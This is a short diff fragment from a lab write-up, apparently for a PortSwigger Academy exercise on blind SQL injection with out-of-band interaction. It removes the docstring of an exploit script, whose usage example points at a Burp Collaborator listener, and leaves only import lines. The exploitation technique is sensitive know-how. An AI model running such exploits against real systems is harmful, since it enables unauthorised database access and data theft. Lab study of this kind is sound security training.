@@ -31,19 +31,6 @@ python3 exploit.py https://<your-lab-id>.web-security-academy.net
 ### Exploit
 
 ```python title="exploit.py"
-"""
-oob_sqli_exploit.py
-
-Exploit Blind SQL Injection with Out-of-Band (OOB) interaction.
-Supports Burp Collaborator, Webhook.site, RequestBin, or your own server.
-
-Usage:
-    python oob_sqli_exploit.py <url> <listener-url>
-
-Example:
-    python oob_sqli_exploit.py https://target.lab https://abcd1234.oastify.com
-"""
-
 import sys
 import requests
 import urllib3
